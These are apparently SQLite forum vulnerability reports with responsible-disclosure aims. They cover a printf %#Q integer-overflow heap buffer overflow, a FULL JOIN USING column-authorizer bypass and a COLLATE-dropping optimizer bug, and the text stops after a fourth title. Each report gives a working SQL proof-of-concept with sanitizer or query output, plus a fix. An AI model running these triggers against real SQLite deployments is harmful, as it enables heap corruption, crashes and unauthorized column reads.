In src/printf.c the %#Q and %#q conversions of sqlite3_str_vappendf() pre-scan the input string to size the output buffer. At lines 994 to 995 the counters nBack and nCtrl are declared u32, where nCtrl is the number of control characters that will each expand to a six byte \u00XX escape. At line 1004 the buffer size is grown by nBack + 5*nCtrl. The literal 5 is promoted to unsigned int, so 5*nCtrl is computed in 32-bit unsigned arithmetic. When nCtrl >= 858993460 the product wraps the u32 range (5 * 858993460 = 4294967300, which is 2^32 + 4, wrapping to 4). The size n then receives a value roughly five billion bytes too small. The buffer allocated by printfTempBuf() at line 1015 is undersized, and the write loop at lines 1031 to 1044 emits six bytes per control character into it, overflowing the heap allocation by about 4 GB worth of writes.

The escape path is reached only with the alternate-form flag (#), so %Q and %q without # are not affected. The control-character count must cross 858993460, which requires an input string near 859 MB of control bytes.

PoC
SQL script (vuln_001.sql):
SELECT printf('%#Q', printf('%.858993460c', char(1)));

The inner printf('%.858993460c', char(1)) builds a string of 858993460 copies of U+0001, a control character. That string is passed to %#Q, which sets nCtrl = 858993460 and triggers the u32 wrap in 5*nCtrl.

Trigger:
/data/ylwang/LargeScan/targets/sqlite/sqlite3 < vuln_001.sql

Trigger output (ASAN build):
==309666==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7fffc01c8b50
WRITE of size 1 at 0x7fffc01c8b50 thread T0
#0 sqlite3_str_vappendf sqlite3.c:33442 (src/printf.c ~line 1032)
#1 sqlite3_str_appendf sqlite3.c:34049
#2 printfFunc sqlite3.c:133235
#3 sqlite3VdbeExec sqlite3.c:104414
...
0x7fffc01c8b50 is located 0 bytes to the right of 858993488-byte region
allocated by thread T0 here:
#5 printfTempBuf sqlite3.c:32573
#6 sqlite3_str_vappendf sqlite3.c:33415
SUMMARY: AddressSanitizer: heap-buffer-overflow sqlite3.c:33442 in sqlite3_str_vappendf
==309666==ABORTING

ASAN reports a WRITE one byte past an 858993488-byte allocation made by printfTempBuf. The allocation matches the wrapped size, while the write loop intends to emit about 5.15 GB for the 858993460 control characters. Exit code 1. The PoC needs roughly 1.7 GB of RAM for the input string and the undersized buffer.

Impact
This is a heap buffer overflow driven entirely from SQL. Any context that lets an attacker control a printf() format argument with the %#Q or %#q conversion, or that applies that conversion to attacker-controlled data, can overflow the destination buffer and corrupt the heap. The conversion is part of the public printf() SQL function, so no extension load and no special build flag is needed. The large input size makes this hard to weaponize for precise control, but the out-of-bounds write is unbounded once triggered.

Fix
Compute the growth in 64-bit so the multiplication cannot wrap:
n += (i64)nBack + (i64)5*(i64)nCtrl;

n is already an i64, so widening the operands before the multiply keeps the size correct for any nCtrl up to SQLITE_MAX_LENGTH.

title: Vuln25-6: FULL JOIN USING and NATURAL FULL JOIN Bypass Column-Level Authorizer Checks

posts.author: drh
posts.body:
Fixed by check-in 4ef88a36f9d9669b.

This is not an important fix so I'm planning to leave it on trunk only,
and not cherry pick into the 3.53.2 release.

posts.author: ylwang (yuelinwang)
posts.body:
Summary
When a USING column of a FULL JOIN is resolved, lookupName() in src/resolve.c at lines 762 to 779 rewrites the TK_ID reference into a TK_FUNCTION node wrapping coalesce(t1.col, t2.col). The two TK_COLUMN arguments of that coalesce are built directly by extendFJMatch() at lines 208 to 222 and never pass through sqlite3AuthRead(). The per-column SQLITE_READ authorization check at resolve.c:840 fires only for nodes whose op is TK_COLUMN or TK_TRIGGER. The rewritten parent is TK_FUNCTION, so the check is skipped, and the TK_COLUMN children were already constructed past the resolver path that would have checked them. The authorizer is never consulted for the USING column, so both SQLITE_IGNORE (replace the value with NULL) and SQLITE_DENY (block the query) are bypassed.

NATURAL FULL JOIN is affected the same way because its shared columns are treated as an implicit USING. LEFT JOIN USING, RIGHT JOIN USING, and FULL JOIN ... ON do not take the coalesce rewrite and are not affected.

PoC
SQL script (vuln_001.sql). The sqlite3 CLI .auth ON command installs an authorizer that logs every callback to stdout and returns SQLITE_OK. A regular SELECT of column x is the baseline, and the same column read through FULL JOIN USING(x) is the trigger:
CREATE TABLE t1(x TEXT, y TEXT);
CREATE TABLE t2(x TEXT, z TEXT);
INSERT INTO t1 VALUES('secret1', 'public_y');
INSERT INTO t2 VALUES('secret1', 'public_z');

.auth ON
SELECT x FROM t1;                          -- baseline: x is read normally
SELECT x FROM t1 FULL JOIN t2 USING(x);    -- trigger: x read via coalesce rewrite
.auth OFF

Trigger:
/data/ylwang/LargeScan/targets/sqlite/sqlite3 :memory: < vuln_001.sql

Trigger output (auth log interleaved with results):
authorizer: SELECT NULL NULL NULL NULL
authorizer: READ "t1" "x" "main" NULL      <- baseline: 1 READ check for x (correct)
secret1
authorizer: SELECT NULL NULL NULL NULL
secret1                                    <- FULL JOIN USING: x value returned
with NO READ check (BUG)

The baseline SELECT x FROM t1 produces a READ "t1" "x" callback. The FULL JOIN USING(x) query returns the same column value with no READ callback at all, proving the authorizer is never consulted for the USING column. NATURAL FULL JOIN t2 behaves identically, while LEFT JOIN USING and FULL JOIN ... ON still emit the expected READ checks.

Impact
CWE-863 Incorrect Authorization. Column-level access control via SQLITE_IGNORE or SQLITE_DENY is bypassed when the protected column is read through FULL JOIN USING or NATURAL FULL JOIN. Affects only builds that install an authorizer.

Fix
Call sqlite3AuthRead() on each TK_COLUMN node that extendFJMatch() creates before it is wrapped in the coalesce, mirroring the check at resolve.c:840.

title: Vuln27-8: Transitive Optimization Discards Explicit COLLATE During pLeft Substitution, Dropping Valid Rows

posts.author: ylwang (yuelinwang)
posts.body:
Summary
In src/whereexpr.c at termIsEquivalence() lines 963 to 986, condition 6b accepts an equality whose overall compare collation is BINARY without checking that neither operand carries an explicit COLLATE (the EP_Collate flag). When the planner substitutes one operand for the other under SQLITE_Transitive, the rewrite at src/wherecode.c lines 2716 to 2732 replaces the alt term's pLeft with a bare column reference and discards the original pLeft that carried EP_Collate. The derived predicate then loses the explicit collation and falls back to the column's default BINARY collation.

Unlike Vuln13, which mixes a BINARY column with a NOCASE-declared column, here both columns are declared BINARY and the NOCASE collation comes from an explicit COLLATE NOCASE annotation on the operand. A query joining t1.a = t2.b with t2.b COLLATE NOCASE = 'Hello' derives t1.a COLLATE NOCASE = 'Hello', but the substituted t1.a has no EP_Collate, so the comparison runs under BINARY and silently drops every row whose case differs from the literal.

PoC
SQL script (vuln_001.sql):
-- vuln_001.sql: Transitive optimization loses explicit COLLATE during pLeft substitution
-- CWE-697: Incorrect Comparison
-- Files: whereexpr.c:963-986, wherecode.c:2716-2732

.headers on
.mode column

-- Setup: two tables with TEXT columns (default BINARY collation)
CREATE TABLE t1(a TEXT);
CREATE TABLE t2(b TEXT);

INSERT INTO t1 VALUES ('hello');
INSERT INTO t1 VALUES ('Hello');
INSERT INTO t1 VALUES ('HELLO');
INSERT INTO t1 VALUES ('HeLLo');

INSERT INTO t2 VALUES ('hello');
INSERT INTO t2 VALUES ('Hello');
INSERT INTO t2 VALUES ('HELLO');
INSERT INTO t2 VALUES ('HeLLo');

-- TEST 2: With transitive optimization ENABLED (default) - BUGGY
SELECT '=== WITH transitive optimization ENABLED (default - BUGGY) ===';
.testctrl optimizations 0x00000000
SELECT t1.a, t2.b
FROM t1 CROSS JOIN t2
WHERE t1.a = t2.b
AND t2.b COLLATE NOCASE = 'Hello';

-- TEST 3: With transitive optimization DISABLED - correct
SELECT '=== WITH transitive optimization DISABLED (correct behavior) ===';
.testctrl optimizations 0x00000080
SELECT t1.a, t2.b
FROM t1 CROSS JOIN t2
WHERE t1.a = t2.b
AND t2.b COLLATE NOCASE = 'Hello';

-- TEST 4: Row counts for easy comparison
SELECT '=== ROW COUNTS ===';
.testctrl optimizations 0x00000000
SELECT 'Transitive ON (buggy):  ' || COUNT(*) AS result
FROM t1 CROSS JOIN t2
WHERE t1.a = t2.b
AND t2.b COLLATE NOCASE = 'Hello';

.testctrl optimizations 0x00000080
SELECT 'Transitive OFF (correct): ' || COUNT(*) AS result
FROM t1 CROSS JOIN t2
WHERE t1.a = t2.b
AND t2.b COLLATE NOCASE = 'Hello';

Trigger:
/data/ylwang/LargeScan/targets/sqlite/sqlite3 < /data/ylwang/LargeScan/targets/sqlite/audit-results/poc/src_whereexpr/vuln_001.sql

Trigger output:
=== WITH transitive optimization ENABLED (default - BUGGY) ===
a      b
-----  -----
Hello  Hello

=== WITH transitive optimization DISABLED (correct behavior) ===
a      b
-----  -----
hello  hello
Hello  Hello
HELLO  HELLO
HeLLo  HeLLo

=== ROW COUNTS ===
Transitive ON (buggy):  1
Transitive OFF (correct): 4

With the default optimizer the NOCASE filter is reduced to BINARY and only the exact-case Hello survives (1 row); disabling SQLITE_Transitive (0x80) restores the correct 4 rows.

Impact
A correctness bug returning wrong results under the default build with no special flags. Any SELECT, DELETE, or UPDATE whose WHERE clause combines an equijoin with an explicit COLLATE annotation on one side can silently drop matching rows, corrupting query results and any access decision that relies on them.

Fix
In termIsEquivalence(), reject the equivalence when either operand carries EP_Collate, so a term annotated with an explicit COLLATE is never used for transitive substitution. Alternatively, preserve the original pLeft collation context when performing the substitution in wherecode.c.

title: Vuln28-9: fts5 Index Iteration Logic Errors Yield Wrong Query Results on Corrupt Databases

posts.author: dan
